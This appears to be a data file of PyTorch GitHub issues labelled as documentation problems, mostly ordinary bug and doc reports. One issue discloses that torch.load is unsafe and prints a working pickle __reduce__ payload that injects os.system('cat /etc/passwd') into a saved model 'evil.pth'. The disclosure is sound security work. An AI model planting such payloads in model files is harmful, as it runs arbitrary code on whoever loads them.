<unknown function> + 0x16b9b7 (0x2ad65921d9b7 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #61: _PyObject_FastCallDict + 0x8b (0x2ad6591c0d7b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #62: <unknown function> + 0x19e7ce (0x2ad6592507ce in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #63: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"The idea is supposed to be to recursively reset the parameters of all the modules (Linear, Conv etc) in the current module (the main network i.e. a CNN).\r\n\r\nThat way reseting the parameters would be a one-liner and autograd and the optimizer would still track the right arrays (when checking for 'id(parameterxyz)'.\r\n\r\nI am aware that one can use the 'apply()' function but I thought this might be a bug.\r\n```\r\nfrom torch.nn import Sequential, Conv2d, ConvTranspose2d, LayerNorm, Linear, BatchNorm1d, MaxPool2d\r\n\r\nclass CNN(torch.nn.Module):\r\n\tdef __init__(self):\r\n\t\tsuper(CNN, self).__init__()\r\n\r\n\t\tself.conv1          = Conv2d(1, 32, kernel_size=5)\r\n\t\tself.pool           = MaxPool2d(2, 2)\r\n\t\tself.conv2          = Conv2d(32, 32, kernel_size=5)\r\n\t\tself.fc1            = Linear(512, 256)\r\n\t\tself.fc2            = Linear(256, 10)\r\n\r\n       def reset_parameters(self):\r\n\t\tfor module in self.modules():\r\n\t\t\tmodule.reset_parameters()\r\n\r\n\tdef forward(self, x):\r\n\t\tx = self.pool(F.relu(self.conv1(x)))\r\n\t\tx = self.pool(F.relu(self.conv2(x)))\r\n\t\tx = x.view(x.size(0), -1)\r\n\t\tx = F.relu(self.fc1(x))\r\n\t\tx = self.fc2(x)\r\n\t\treturn x\r\n\r\nmodel = CNN()\r\nmodel.reset_parameters()\r\n```\r\n\r\n - PyTorch Version : 1.3.1\r\n - OS (e.g., Linux): Mac\r\n\r\nPS: Sorry for the format ... somehow I'm not succeeding at making the code format work\r\n(EDIT: fixed)\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nPyTorch serialization mechanisms are built upon the `pickle` library that is [known to be insecure](https://docs.python.org/3/library/pickle.html) when dealing with third-party data.\r\nIt concerns both the saved model parameters and the entire model saving (which are considered to be the [best practices](https://pytorch.org/docs/stable/notes/serialization.html))\r\n\r\n### Example script, that infects any existing model:\r\n\r\n```python\r\nimport torch\r\nimport pickle\r\n\r\nON_REDUCE = \"\"\"\r\nglobal MAGIC_NUMBER\r\nMAGIC_NUMBER = None\r\nimport os;os.system('cat /etc/passwd')\r\n\"\"\"\r\n\r\nclass Payload:\r\n    def __reduce__(self):\r\n        return (exec, (ON_REDUCE,))\r\n\r\nmodel = torch.load('inception_v3_google-1a9a5a14.pth')\r\ntorch.serialization.MAGIC_NUMBER = Payload()\r\ntorch.save(model, 'evil.pth')\r\n```\r\n\r\nThen, if any user will download an infected model and execute `torch.load('evil.pth')` the arbitrary command will be executed on his device. That is also relevant to [torch.hub.load](https://pytorch.org/docs/stable/hub.html#torch.hub.load), which will download and deserialize the model itself.\r\n\r\n### Small demo:\r\n![image](https://user-images.githubusercontent.com/23273750/71783559-11da7080-301b-11ea-8860-16ac30f0bdf6.png)\r\n\r\n### Proposed solution\r\nAs an easy solution you may consider adding a warning in a [documentation](https://pytorch.org/docs/stable/notes/serialization.html), that warns the users of using untrusted models\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null,null,null],"text":"## 📚 Documentation\r\n \r\nDocumentation for `scatter_` and `scatter_add_` incorrectly states that \"Moreover, as for gather(), the values of index must be between 0 and self.size(dim) - 1 inclusive, and all values in a row along the specified dimension dim must be unique.\"\r\nhttps://pytorch.org/docs/stable/tensors.html?highlight=scatter_add#torch.Tensor.scatter_\r\nThere is no requirement for elements to be unique in either of 3 functions (`scatter_`, `scatter_add_`, `gather`), and `gather` documentation correctly does not mention that requirement.\r\nIn case of `scatter_`, there is no guarantees of which value from the source with the same indices ends up being written to `self`, in case of `scatter_add_` values from the source with the same indices are accumulated. \r\nThere is a broader issue aside from the documentation here, because depending on whether indices are unique or repeating, parallel implementation for `scatter_add_` can be different (`scatter` is fine although can be non-deterministic). Maybe we should allow users to indicate if their indices are unique, so that we can choose more efficient implementation. The implementation variants are\r\n1) indices are guaranteed to be unique - any naive implementation writing values from src to self will work, parallelization is easy\r\n2) non-unique indices, but we are fine with non-deterministic behavior - we can use atomic accumulation in this case, and still do efficient parallelization\r\n3) non-unique indices, and we want deterministic results - some more sophisticated algorithms required, handling accumulation for repeating indices (e.g. pre-sorting indices)\r\nCurrently we have 2) for cuda implementation and no parallelization for CPU, afaikt.\r\nSetting \"triage review\" label to discuss desired behavior.\r\ncc @ezyang @SsnL @gchanan @nikitaved\r\n"},{"labels":["documentation",null,null],"text":"There is no description of torch.constant_pad_nd in the document. What is the specific function of this interface? I tried to read the source code of aten（aten/src/ATen/native/ConstantPadNd.cpp）, but it was a little difficult for me hh.\r\n```\r\nimport torch\r\na = torch.randn(4)\r\ntorch.constant_pad_nd(a, [1, 2], 0.5)\r\n```\r\n"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/onnx.html?highlight=export#torch.onnx.export\r\n![image](https://user-images.githubusercontent.com/1041752/71543968-89ecca80-2979-11ea-8bbc-366b6e5c556c.png)\r\n\n\ncc @ezyang @zou3519"},{"labels":[null,"documentation",null],"text":"There is no description of torch.poisson in the document. What is the specific function of this interface?\r\n```\r\nimport torch\r\na = torch.randn(4)\r\ntorch.poisson(a)\r\n```\r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n### Some Question\r\nwhen I try some math operations, like torch.std, keepdim is not its 3rd parameter, but torch.mean is. That make me confusion.\r\n```python\r\na = torch.randn(3, 3, 3)\r\ntorch.mean(a, (1, 2), True)\r\n# tensor([[[-0.2389]], \r\n#           [[-0.3910]],\r\n#           [[ 0.2703]]])\r\ntorch.std(a, (1, 2), True)\r\n# tensor([1.4173, 0.9174, 1.1403])\r\n```\r\n\r\n### Another type wrong\r\nin doc, the second item of torch.std_mean, that is torch.std(input, dim, keepdim=False, unbiased=True)\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.scatter\r\n> `scatter(dim, index, source)` → Tensor\r\n\r\nThe argument name is `src`, not `source`. `source` will cause an error in the current Pytorch version, and `src` will cause an error in older versions."},{"labels":[null,null,"documentation",null],"text":"Current, [Our Own Ring-Allreduce](https://pytorch.org/tutorials/intermediate/dist_tuto.html#our-own-ring-allreduce) example is not correct. It will NOT perform all reduce on selected tensors. The code to reproduce is attached below\r\n\r\n ```python\r\n\"\"\" Implementation of a ring-reduce with addition. \"\"\"\r\ndef allreduce(send, recv):\r\n    rank = dist.get_rank()\r\n    size = dist.get_world_size()\r\n    send_buff = th.zeros(send.size())\r\n    recv_buff = th.zeros(send.size())\r\n    accum = th.zeros(send.size())\r\n    accum[:] = send[:]\r\n\r\n    left = ((rank - 1) + size) % size\r\n    right = (rank + 1) % size\r\n\r\n    for i in range(size - 1):\r\n        if i % 2 == 0:\r\n            # Send send_buff\r\n            send_req = dist.isend(send_buff, right)\r\n            dist.recv(recv_buff, left)\r\n            accum[:] += recv[:]\r\n        else:\r\n            # Send recv_buff\r\n            send_req = dist.isend(recv_buff, right)\r\n            dist.recv(send_buff, left)\r\n            accum[:] += send[:]\r\n        send_req.wait()\r\n    recv[:] = accum[:]\r\n\r\ndef run_allreduce(rank, size):\r\n    data = torch.ones(3)  * (rank + 1)    \r\n    recv = torch.zeros_like(a)\r\n    allreduce(send=data, recv=recv)\r\n    print(recv)\r\n\r\ndef init_process(rank, size, fn, backend='gloo'):\r\n    \"\"\" Initialize the distributed environment. \"\"\"\r\n    os.environ['MASTER_ADDR'] = '127.0.0.1'\r\n    os.environ['MASTER_PORT'] = '29500'\r\n    dist.init_process_group(backend, rank=rank, world_size=size)\r\n    fn(rank, size)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    size = 4\r\n    processes = []\r\n    for rank in range(size):\r\n        p = Process(target=init_process, args=(rank, size, run_allreduce))\r\n        p.start()\r\n        processes.append(p)\r\n\r\n    for p in processes:\r\n        p.join()\r\n```\r\n\r\nThe terminal output is \r\n\r\n```bash\r\n~/Workspace$ python main.py\r\n# original data\r\nMessage from 0 tensor([0., 0., 0.])\r\nMessage from 1 tensor([1., 1., 1.])\r\n# data after allreduce (does not work as expect)\r\nMessage from 0 tensor([0., 0., 0.])\r\nMessage from 1 tensor([1., 1., 1.])\r\n```\r\n\r\nThe correct code snippet should be \r\n\r\n```python\r\ndef allreduce(send, recv):\r\n    rank = dist.get_rank()\r\n    size = dist.get_world_size()\r\n    send_buff = send.clone()\r\n    recv_buff = send.clone()\r\n    accum = send.clone()\r\n\r\n    left = ((rank - 1) + size) % size\r\n    right = (rank + 1) % size\r\n\r\n    for i in range(size - 1):\r\n        if i % 2 == 0:\r\n            # Send send_buff\r\n            send_req = dist.isend(send_buff, right)\r\n            dist.recv(recv_buff, left)\r\n            accum[:] += recv_buff[:]\r\n        else:\r\n            # Send recv_buff\r\n            send_req = dist.isend(recv_buff, right)\r\n            dist.recv(send_buff, left)\r\n            accum[:] += send_buff[:]\r\n        send_req.wait()\r\n    recv[:] = accum[:]\r\n```\r\n\r\nThough I didn't quite understand the usage of `send_buffer` and `recv_buffer` here, to avoid read/write collision? \r\n\r\n\n\ncc @ezyang @gchanan @zou3519 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nCan't pin storage memory.\r\nNot sure if this is planned or common behavior, but if this is part of the interface I guess it shouldn't fail.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. ```import torch; torch.randn(10).storage().pin_memory()```\r\n\r\nAttributeError: module 'torch.cuda' has no attribute '_host_allocator'\r\n\r\n## Expected behavior\r\nReturns a copy of storage which is pinned.\r\n\r\n## Environment\r\n(built from source)\r\n\r\nCollecting environment information...\r\nPyTorch version: nightly\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: Could not collect\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: Could not collect\r\nGPU models and configuration: \r\nGPU 0: GeForce RTX 2080 Ti\r\nGPU 1: GeForce RTX 2080 Ti\r\nGPU 2: GeForce RTX 2080 Ti\r\nGPU 3: GeForce RTX 2080 Ti\r\nGPU 4: GeForce RTX 2080 Ti\r\nGPU 5: GeForce RTX 2080 Ti\r\nGPU 6: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 440.44\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.4\r\n[pip] torch==nightly\r\n[pip] torchvision==0.5.0a0+2d7c066\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                      243  \r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   nightly         py3.7_cuda10.1.243_cudnn7.6.5_1    saareliad\r\n[conda] torchvision               0.5.0a0+2d7c066          pypi_0    pypi## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\r\n(What I'm really trying to do is find some hack to create pinned memory which is also shared, currently only managed to do so with pin_memory() than os.fork(), (before cuda is initialized), I'd like to do it on Storage too and not just the tensor itself)...\n\ncc @ngimel "},{"labels":["documentation",null],"text":"**UPD** summary of all the long discussion for further discoverability:\r\n1. F.ctc_loss will produce inf loss if presented with invalid unalignable examples\r\n2. Such invalid examples may be generated by official usage code example if one is extremely unlucky or if one twists the dimension sizes a little bit\r\n3. When presented with invalid examples, sum and mean reduction modes by default cause the whole batch loss to be **inf**\r\n\r\nProposals:\r\n1. Have docs warn clearly about conditions on valid examples\r\n2. Have docs warn clearly that the official usage example may produce invalid examples / fix the official code example\r\n3. Enable zero_infinity = True by default or at least in reduction modes sum/mean\r\n\r\n**BELOW IS THE ORIGINAL ISSUE DESCRIPTION**\r\n\r\n```python\r\nimport torch\r\nimport torch.nn.functional as F\r\n\r\ndef test_ctc(C, B = 1, T = 2, full = False):\r\n    log_probs = torch.randn(B, C, T).log_softmax(dim = 1)\r\n    input_lengths = torch.full((B,), T, dtype=torch.long)\r\n\r\n    target_lengths = torch.full((B,), T, dtype = torch.long)\r\n    if full:\r\n        targets = torch.full((B, T), C - 1, dtype = torch.long)\r\n    else:\r\n        targets = torch.randint(1, C, (B, T), dtype=torch.long)\r\n\r\n    loss = F.ctc_loss(log_probs.permute(2, 0, 1), targets, input_lengths, target_lengths)\r\n    print(float(loss))\r\n\r\ntest_ctc(C = 64, full = False)\r\n# 4.894557952880859\r\n\r\ntest_ctc(C = 2, full = False)\r\n# inf\r\n\r\ntest_ctc(C = 64, full = True)\r\n# inf\r\n```\r\n\r\nDocs specify that targets can't be blank. If same consecutive labels are not supported, I think it should be explicitly mentioned in docs. And maybe docs should specify some workaround to encode consecutive same-valued targets (given that blank to separate them isn't allowed by docs).\r\n\r\nCurrent docs: `Each element in the target sequence is a class index. And the target index cannot be blank (default=0)`"},{"labels":[null,"documentation",null],"text":"https://pytorch.org/docs/master/torch.html?highlight=histc#torch.histc:\r\n```\r\nmin (int) – lower end of the range (inclusive)\r\nmax (int) – upper end of the range (inclusive)\r\n```\r\n\r\nI think this is erroneous, the type should be float and also to accept PyTorch scalar type (as it can be common to write `min = bins_tensor.min(), max = bins_tensor.max())`"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe documentation for [BCELoss](https://pytorch.org/docs/stable/nn.html#bceloss) explains that the formula used to compute the loss is `l_n = -w_n [y_n \\ln(x_n)+(1-y_n)\\ln(1-x_n)]`. However, the documentation does not explain what happens when `x_n = 0, 1` with `0 < y_n < 1`. In these two cases, the result should be infinite.\r\n\r\nIt appears that the value is quietly substituted for stability. However, there is no mention of this in the documentation for the loss layer, nor is it explained how this is accomplished.\r\n\r\nI also could not find the code that implemented binary_cross entropy. I bring this up because the code should be consulted when explaining what is happening for these edge cases.\r\n\r\n(This came up while investigating #31396)\n\ncc @ezyang @gchanan @zou3519"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new --> [https://pytorch.org/docs/stable/nn.html#nllloss](url) yi = ith element in the target tensor\r\n"},{"labels":["documentation",null],"text":"`torch::pickle_save` and `torch::pickle_load` have no docs, maybe `torch::save/load` should also be deprecated since they are more limited"},{"labels":["documentation",null],"text":"## 🚀 Feature\r\nIt would be excellent to have a button to download the docs for offline use, from the main docs page. This is an included feature on Sphinx. For example: on [Flask's docs](http://flask.palletsprojects.com/en/1.1.x/), if you click the floating green version in the lower right, there's a \"download html\" option.\r\n\r\n## Motivation\r\nBuilding the source to make the docs locally is very time consuming, and sometimes you want to learn something offline. My specific use-case is programming on a plane.\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null,null],"text":"`THCCachingHostAllocator` mentions that:\r\n\r\nhttps://github.com/pytorch/pytorch/blob/af638ad5d7c8fc9ff97f0ad1cd2bbcfa3ced514e/aten/src/THC/THCCachingHostAllocator.cpp#L85-L88\r\n\r\nHowever @baobablyh discovers that, if multiple processes call pinned memory with the same default device, it could hang either at the pinned memory tensor creation or some subsequent D2H communication (see #31095 for more discussion, #28883 and #30945 for code). We haven't found out the root cause yet, but it looks like pinned memory would have some side effect on the current device. While we continue investigating the root cause, we should add an `N.B.` to the above comments and `pinned_memory` API doc to warn future users/devs.\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"Trying to use `torch.logsumexp` over multiple dimensions errors out.\r\n\r\n```python3\r\n>>> A = torch.ones(3, 3)\r\n>>> torch.logsumexp(A, dim=(0, 1))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: logsumexp(): argument 'dim' must be int, not tuple\r\n```\r\n\r\nHowever, in the latest stable documents (https://pytorch.org/docs/stable/torch.html#torch.logsumexp), it clearly states for the `dim` parameter:\r\n```\r\ndim (int or tuple of python:ints) – the dimension or dimensions to reduce.\r\n```\r\nThroughout the description, it also talks about `dim` as being allowed to be multi-dimensional.\r\n\r\nAccording to #15597, this should be fixed, but it's not.\r\n\r\nFurthermore, I believe that `torch.logsumexp` should treat dimension similarly to `torch.sum`. Just like `torch.sum`, it should absolutely allow for `dim` to be a tuple of ints. And if `dim` is not specified, it should operate over the whole tensor."},{"labels":["documentation",null],"text":"MathJax in your docs is by default rendered tiny (too small to read) in Firefox...\r\n\r\nExample screenshot from: https://pytorch.org/tutorials/beginner/blitz/autograd_tutorial.html\r\n<img width=\"862\" alt=\"image\" src=\"https://user-images.githubusercontent.com/464192/70542681-6d732480-1b69-11ea-8daf-e3fa3aa62822.png\">\r\n\r\nMy guess is some CSS problem..."},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHi, when I try to follow the tutorial **Using the PyTorch C++ Frontend**. At the beginning of the article，the toy example CMakeLists.txt was written like this:\r\n```\r\ncmake_minimum_required(VERSION 3.0 FATAL_ERROR)\r\nproject(dcgan)\r\n\r\nfind_package(Torch REQUIRED)\r\n\r\nadd_executable(dcgan dcgan.cpp)\r\ntarget_link_libraries(dcgan \"${TORCH_LIBRARIES}\")\r\nset_property(TARGET dcgan PROPERTY CXX_STANDARD 11)\r\n```\r\n\r\nBut I get the **error** `error: #error You need C++14 to compile PyTorch`.\r\nI guess in the latest libtorch version, you may use some C++ 14 features. So, I change the last line in CMakeLists.txt to `set_property(TARGET dcgan PROPERTY CXX_STANDARD 14)`. It worked. I think we should make some updates for this tutorial."},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nWe should add docs for the c10d.ProcessGroupGloo and c10d.ProcessGroupNCCL constructors since calling them directly is a way of initializing multiple process groups on a single node. There is a use case for initializing multiple process groups with different backends. For example using NCCL for DDP GPU communication and GLOO for send/recv primitives. This functionality already exists in our distributed package but users were unaware of this since it wasn't documented clearly.\r\n\r\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528"},{"labels":["documentation",null,null],"text":"I have a simple question. I want to confirm that when I specify a class index in ignore_index, and reduction = 'mean', then the loss is not averaged over the ignored class.\r\n\r\nIn the documentation, it says \"When size_average is True, the loss is averaged over non-ignored targets.\" Just want to make sure that it will behave the same when reduction is 'mean'"},{"labels":["documentation",null,null],"text":"The gist of the issue is that at one point in my network in my project I feed positive float32 inputs `X` and `W` into a 1d (or 2d) convolution, but unexpectedly obtain explicitly negative outputs.\r\n\r\n## Details\r\nThe X input is nonnegative about 1e-2 with many explicit 0 (after an elementwise square, or abs), and the W input is positive but with quite large range of [1e–8, 1e+8] (after an exp). I take `F.conv2d(X, W, None)` and **expect nonnegative** outputs (finite or infinite), but actually get **significantly negative** values. The downstream computations rely on the result of this operation to be at least nonnegative.\r\n\r\nI tried `torch.backends.cudnn.deterministic = True`, or fp64, or clamping the `W` value and each time the problem seemed to had gone away. In my project I ended up clamping the result of the convolution to nonnegative range, and it sufficed.\r\n\r\nHaving observed this oddity got me worried, since in my understanding of floating point arithmetic the loss of precision and round off could yield imprecise results, but not **flip the sign** of the overall result. I read in the docs, that non-deterministic cudnn algorithms might induce this behaviour and yield inconsistent results, but I did not expect that atomic additions (according to cudnn reference) could spuriously flip the sign bit of a 32bit float.\r\n\r\nI understand that Github issues are not a Q&A support forum, but I think that this inconsistency, might of interest, and would very much appreciate any discussion of guarantees of single precision operations.\r\n\r\n## Minimally reproducing example\r\nI came up with a minimal example of this odd behaviour. My observations are as follows (based on this snippet, and on the real data within the network in my project):\r\n* negative outputs of various magnitude occur **only if** deterministic is *False*, and data is *fp32*, and the input `X` is a moderately large-dim tensor.\r\n* `X` and `W` of dims `...x12x12` and `...x4x4`, respectively, give a lot of very small fp32 numbers, some of which are negative\r\n* `X` and `W` of dims `...x11x11` and `...x3x3`, respectively, produce very rare negative tiny fp32, but mostly expected zeros\r\n\r\nThese suggest that some optimizations within cudnn might be responsible.\r\n\r\nThe following code constructs explicitly nonnegative `X` and `W`: `X` all zeros except for a single **1** at the *centre*, `W` is a 4x4 kernel with constant **1e-3**. I attach the pickled  [result.gz](https://github.com/pytorch/pytorch/files/3935238/result.gz)\r\n\r\n```python\r\nimport gzip\r\nimport torch\r\nimport torch.nn.functional as F\r\n\r\n# change these\r\ntorch.backends.cudnn.deterministic = False\r\ndevtype = dict(device=torch.device(\"cuda:0\"), dtype=torch.float32)\r\n\r\n# x -- zeros with a spike\r\nx = torch.zeros(1024, 1, 12, 12).to(**devtype)  \r\nx[..., 5, 5] = 1.\r\n\r\n# small nonnegative values\r\nw = (torch.ones(1, 1, 4, 4) * 1e-3).to(**devtype)\r\nassert x.ge(0).all() and w.ge(0).all()\r\n\r\n# conv1d/2d\r\nresult = F.conv2d(x, w, None)\r\nwith gzip.open(\"result.gz\", \"wb\") as fout:\r\n    torch.save(dict(x=x, w=w, result=result), fout)\r\n\r\nassert result.ge(0).all()\r\n```\r\n\r\nTo unpack the attached `.gz` pickled result.\r\n```python\r\nimport gzip\r\nimport torch\r\n\r\nwith gzip.open(\"result.gz\", \"rb\") as fin:\r\n    pack = torch.load(fin)\r\n\r\npack[\"result]\r\n```\r\n\r\nHere is a link to a [colab notebook](https://colab.research.google.com/drive/136n8oKDitchxEkXMhV7AJeYfFUayiS4X), where it can be seen, that the output is spurious even for `X` is `25 x 1 x 12 x 12`. Especially striking is that `24 x 1 x 12 x 12` appears to be correct.\r\n\r\n## Specs and versions\r\nBelow are very abridged specs:\r\n\r\n`Intel(R) Xeon(R) CPU E5-2698 v4 @ 2.20GHz, 256GB RAM`, `4x GeForce GTX 1080 Ti` with `Driver Version: 390.77` on `Linux Mint 18.3 Sylvia (GNU/Linux 4.10.0-38-generic x86_64)` and conda `python 3.7.4` packages:\r\n* `pytorch                   1.1.0           py3.7_cuda9.0.176_cudnn7.5.1_0    pytorch`\r\n* `cudatoolkit               9.0                  h13b8566_0`\r\n"},{"labels":["documentation",null],"text":"Going to https://pytorch.org/docs/stable/__config__.html or https://pytorch.org/docs/master/__config__.html hits the 404 page\r\n\r\n![image](https://user-images.githubusercontent.com/9407960/70189001-f93b0b80-16a6-11ea-8f20-47d058eb2fee.png)\r\n\r\nWeirdly it does work fine on a local docs build\r\n\r\n![image](https://user-images.githubusercontent.com/9407960/70189029-0952eb00-16a7-11ea-974b-738e6c5c8150.png)\r\n"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nWhen someone writes a new torch operator and forgets to add an entry to https://github.com/pytorch/pytorch/blob/master/docs/source/torch.rst, the `test/test_doc_coverage.py` gives the following error:\r\n\r\n```\r\nDec 04 22:30:21 ======================================================================\r\nDec 04 22:30:21 FAIL: test_torch (__main__.TestDocCoverage)\r\nDec 04 22:30:21 ----------------------------------------------------------------------\r\nDec 04 22:30:21 Traceback (most recent call last):\r\nDec 04 22:30:21   File \"test_docs_coverage.py\", line 77, in test_torch\r\nDec 04 22:30:21     don't want to document?''')\r\nDec 04 22:30:21 AssertionError: \r\nDec 04 22:30:21 The lists of functions documented in torch.rst and in python are different.\r\nDec 04 22:30:21 Did you forget to add a new thing to torch.rst, or whitelist things you\r\nDec 04 22:30:21 don't want to document?\r\n```\r\n\r\nThis is not the clearest thing in the world. I see the following two improvements we could make:\r\n1) List out what functions are different.\r\n2) Explicitly state what torch.rst is. Something like \"For the documentation of an operator to appear in <insert_link_to_docs>, it needs an entry in torch.rst <link to torch.rst>. Please add one\"\r\n\r\nWe got pretty confused over in https://github.com/pytorch/pytorch/pull/30493 about this.\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/70160941-4b6d3400-1689-11ea-9033-b44a9b2a3c15.png)\r\n"},{"labels":[null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nIn some cases - as in the example below, tensor.max() fails to log the indices in the cuda result.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nrnd = torch.tensor([[ 0.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 0.5000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 8.0000,  8.0000,  8.0000,  8.0000,  8.0000,  8.0000,  8.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000],\r\n        [ 7.0000,  7.0000,  7.0000,  7.0000,  7.0000,  7.0000, -1.0000, -1.0000,\r\n         -1.0000, -1.0000, -1.0000]])\r\n\r\nprint(rnd.max(dim=1))\r\nprint((rnd.cuda()).max(dim=1))\r\n\"\"\" my results: \r\n# CPU\r\ntorch.return_types.max(\r\nvalues=tensor([0.0000, 0.5000, 8.0000, 7.0000]),\r\nindices=tensor([0, 0, 6, 5]))\r\n#CUDA\r\ntorch.return_types.max(\r\nvalues=tensor([0.0000, 0.5000, 8.0000, 7.0000], device='cuda:0'),\r\nindices=tensor([0, 0, 0, 0], device='cuda:0'))\r\n\"\"\"\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\nI'd've expected torch.max to return same order of max indices in  cuda and cpu.\r\n\r\n## Environment\r\n\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.0.130\r\n\r\nOS: Ubuntu 18.04.3 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: GPU 0: TITAN RTX\r\nNvidia driver version: 435.21\r\ncuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.4\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.17.2\r\n[pip] torch==1.3.0\r\n[pip] torchaudio==0.2\r\n[pip] torchfile==0.1.0\r\n[pip] torchvision==0.4.1a0+d94043a\r\n[conda] mkl                       2019.4                      243  \r\n[conda] pytorch                   1.3.0           py3.6_cuda10.0.130_cudnn7.6.3_0    pytorch\r\n[conda] torchaudio                0.2.0                    py36_1    pytorch\r\n[conda] torchfile                 0.1.0                      py_0    conda-forge\r\n[conda] torchvision               0.4.1                py36_cu100    pytorch\r\n\r\n<!-- Add any other context about the problem here. -->\r\nThis is a special case, clearly, I encountered debugging some results. I would expect the indices to return the same preference: if one calls .max() on  a tensor, the index reutrned by cpu is the highest index of the highest value, in cuda, it is the lowest index of the highest value.\r\n\r\n## Workaround found: argmax returns the same order of indices\r\n```python\r\nprint(\"argmax\")\r\nprint(torch.argmax(rnd, dim=1))\r\n\r\nprint(\"argmax cuda\")\r\nprint(torch.argmax(rnd.cuda(), dim=1))\r\n\r\n\"\"\" argmax results\r\nargmax\r\ntensor([0, 0, 6, 5])\r\nargmax cuda\r\ntensor([0, 0, 6, 5], device='cuda:0')\r\n\"\"\"\r\n```\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nUsers typically expect in-place operations to save memory over out of place variants. There are some cases, e.g. when mixed-type operations will perform the op into a different tensor of a common dtype, or when (after https://github.com/pytorch/pytorch/pull/30429), performing certain operations on uncoalesced sparse tensors. The memory characteristics should be explained somewhere in the docs.\r\n\r\n\r\n\n\ncc @vincentqb"},{"labels":[null,null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nI am using a Tesla K40m, installed pytorch 1.3 with conda, using CUDA 10.1\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Have a box with a Tesla K40m\r\n1. `conda install pytorch cudatoolkit -c pytorch`\r\n1. show cuda is available\r\n```\r\npython -c 'import torch; print(torch.cuda.is_available());'\r\n>>> True\r\n```\r\n1. Instantiate a model and call `.forward()`\r\n```\r\nTraceback (most recent call last):\r\n  File \"./baselines/get_results.py\", line 395, in <module>\r\n    main(args)\r\n  File \"./baselines/get_results.py\", line 325, in main\r\n    log_info = eval_main(eval_args)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/baselines/eval_task.py\", line 165, in main\r\n    log_info = trainer.test(0, evaluate=True)\r\n  File \"/mnt/cdtds_cluster_home/s0816700/git/midi_degradation_toolkit/mdtk/pytorch_trainers.py\", line 110, in test\r\n    evaluate=evaluate)\r\n  